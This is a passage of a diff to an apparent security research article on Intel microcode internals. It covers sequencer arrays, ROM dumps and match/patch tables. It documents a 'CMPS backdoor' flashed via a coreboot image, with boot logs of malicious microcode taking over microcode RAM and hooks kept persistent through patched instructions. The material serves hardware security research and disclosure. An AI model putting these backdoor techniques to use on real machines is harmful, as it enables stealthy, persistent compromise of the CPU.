+  |   0x6A0 |        3 | ms_match_patch | Microcode match/patch         |
+  |   0x6A0 |        4 | ms_ram         | Microcode RAM triads          |
+
+
+Some control registers are not listed above. For example, set/unset bit-0
+of 0x692 to disable/enable the match/patch mechanism. And, writing 0 to
+0x38C halts frontend instruction fetching. 
+
+The Microcode Sequencer utilizes five memory arrays. As previously
+described, array 3 stores the match/patch table. Arrays 0 and 1 form the
+microcode ROM space, spanning addresses 0x0000 through 0x7BFF. The writable
+RAM space consists of Arrays 2 and 4, occupying the address range from
+0x7C00 to 0x7DFF for microcode updates.
+
+Arrays 0 and 4 store microcode triads, with each entry consisting of three
+micro-operations and one unused field. For example, partial dump from array
+0:
+
+ addr   uop0         uop1         uop2         unused   
+ 0000:  00626803f200 000801030008 004800013000 000000000000
+ 0004:  05b900013000 000a01000200 014800000000 000000000000
+ 0008:  000c6c97e208 0005a407de08 01310023d23d 000000000000
+ 000c:  00470003dc7d 0150015c027d 000000000000 000000000000
+ ...
+ 7bfc:  000000000000 000000000000 000004d3ebf4 000000000000
+
+
+Each microcode triad comprises three micro-instructions located at
+consecutive addresses (e.g., 0x0000-0x0002), with the fourth position
+consistently unused and zeroed. Array 4 maintains an identical structure
+for the writable microcode RAM space.
+
+Arrays 1 and 2 contain the sequence words that correspond to each microcode
+triad. As shown in this partial dump from array 1:
+
+ addr   seqw
+ 0000:  0000018e5e40 0000018e5e40 0000018e5e40 0000018e5e40
+ 0004:  00000b000240 00000b000240 00000b000240 00000b000240
+ 0008:  000001890900 000001890900 000001890900 000001890900
+ 000c:  000006a71180 000006a71180 000006a71180 000006a71180
+ ...
+ 7bfc:  0000018000c0 0000018000c0 0000018000c0 0000018000c0
+
+
+This quadruple repetition occurs because only one sequence word is needed
+per microcode triad and the addressing scheme for sequence word access may
+use (Uaddr >> 2) as the index. The design likely enables parallel fetching
+of both microcode triads and their corresponding sequence words by
+maintaining address alignment between the two structures.
+
+For the CMPS backdoor, if the pre-built coreboot image is correctly flashed
+onto the board, the following logs will appear in the serial console during
+boot. These logs demonstrate how the malicious microcode takes over the
+MSRAM.
+
+ [INFO ]  patching addr: 00007dbc - ram: 000001bc
+ [INFO ]  7dbc: 11890b8279c8 11890b8279c8 11890b826988 018000c0
+ [INFO ]  7dc0: 11890b826988 000000000000 000000000000 018000c0
+ [INFO ]  7dc4: 100500021861 237d3f000e88 0fff00000000 030000f2
+ [INFO ]  Patching 3de8 -> 7dc8
+ [INFO ]  7dc8: 000000000000 1c0000231027 0008901f000d 018000c0
+ [INFO ]  7dcc: 006410030230 0040d75b0230 006410030230 018000c0
+ [INFO ]  7dd0: 0040e65f0330 006410030230 00403d770370 018000c0
+ [INFO ]  7dd4: 000000000000 00450003ac31 0150bc7402fa 018000c0
+ [INFO ]  7dd8: 1c0000231027 1c0000630026 108501034d08 018000c0
+ [INFO ]  7ddc: 015dec740240 015ded740240 015dee740240 018000c0
+
+
+In the match/patch table, the last two entries are occupied: one
+corresponds to the backdoor hook (previously described, though with a
+different offset due to CPU stepping), and the other is the IN instruction
+microcode patch, which is critical for maintaining persistent microcode
+hooks.
+
+ idx p src   dst
+ 00: 0 0x0000  0x0000
+ 01: 1 0x4dc0  0x7c4c
+ 02: 1 0x2078  0x7c0e
+ 03: 1 0x682a  0x7c86
+ 04: 1 0x1c3c  0x7c30
+ 05: 1 0x6a10  0x7c44
+ 06: 1 0x3c7a  0x7c22
+ 07: 1 0x4f52  0x7cca
+ 08: 1 0x01d6  0x7c6a
+ 09: 1 0x2e44  0x7cbe
+ 10: 1 0x70fa  0x7c9e
+ 11: 1 0x13c2  0x7cea
+ 12: 1 0x67a0  0x7c6e
+ 13: 1 0x0cd2  0x7c82
+ 14: 1 0x209c  0x28d8
+ 15: 1 0x141e  0x7c96
+ 16: 1 0x24bc  0x7c8a
+ 17: 1 0x623a  0x7d16
+ 18: 0 0x0000  0x0000
+ 19: 0 0x0000  0x0000
+ 20: 0 0x0000  0x0000
+ 21: 0 0x0000  0x0000
+ 22: 0 0x0000  0x0000
+ 23: 0 0x0000  0x0000
+ 24: 0 0x0000  0x0000
+ 25: 0 0x0000  0x0000
+ 26: 0 0x0000  0x0000
+ 27: 0 0x0000  0x0000
+ 28: 0 0x0000  0x0000
+ 29: 0 0x0000  0x0000
+ 30: 1 0x3de8  0x7dc8
+ 31: 1 0x58ba  0x017a
+
+
 --[ 4. Misc 
 
 ----[ 4.1 x86 SSE/AVX Instruction Set
@@ -1540,6 +2406,29 @@ with me, even when I'm not at my best. Love you guys!
 [17] https://sourceware.org/glibc/wiki/GNU_IFUNC
 [18] Designing and implementing malicious hardware
 [19] https://openpower.foundation/specifications/isa/
+[101] Alexander Krog and Alexander Skovsende. Backdoor in the Core - Altering
+    the Intel x86 Instruction Set at Runtime. Defcon 31, 2023 
+[102] RISC86 INSTRUCTION SET. US Patent US5926642, 1999
+[104] AMD-K6 Processor Technical Brief
+    https://www.ardent-tool.com/CPU/docs/AMD/K6/k6_techb.pdf
+[105] IntelTXE-PoC. https://github.com/ptresearch/IntelTXE-PoC
+[106] https://www.intel.com/content/www/us/en/security-center/advisory/
+    intel-sa-00086.html
+[107] uCodeDisam. https://github.com/chip-red-pill/uCodeDisasm
+[108] udbgInstr https://github.com/chip-red-pill/udbgInstr
+[109] lib-micro. https://libmicro.dev
+[110] https://kakaroto.ca/2019/11/exploiting-intels-management-engine-part-1
+     -understanding-pts-txe-poc/
+[111] EFFICIENT RANGE - BASED MEMORY WRITEBACK TO IMPROVE HOST TO DEVICE
+     COMMUNICATION FOR OPTIMAL POWER AND PERFORMANCE. US Patent 
+     US 10,552,153 B2. 2020
+[112] Ermolov, M., Sklyarov, D. & Goryachy, M. Undocumented x86 instructions
+     to control the CPU at the microarchitecture level in modern Intel
+     processors. J Comput Virol Hack Tech 19. 2023
+[113] CONTROL REGISTER BUS ACCESS THROUGH A STANDARDIZED TEST ACCESS PORT.
+     US Patent US006055656A. 2000
+[114] Intel LDAT notes. https://pbx.sh/ldat/
+[115] crbus_scripts. https://github.com/chip-red-pill/crbus_scripts
 
 
 --[ 8. Appendix: Code
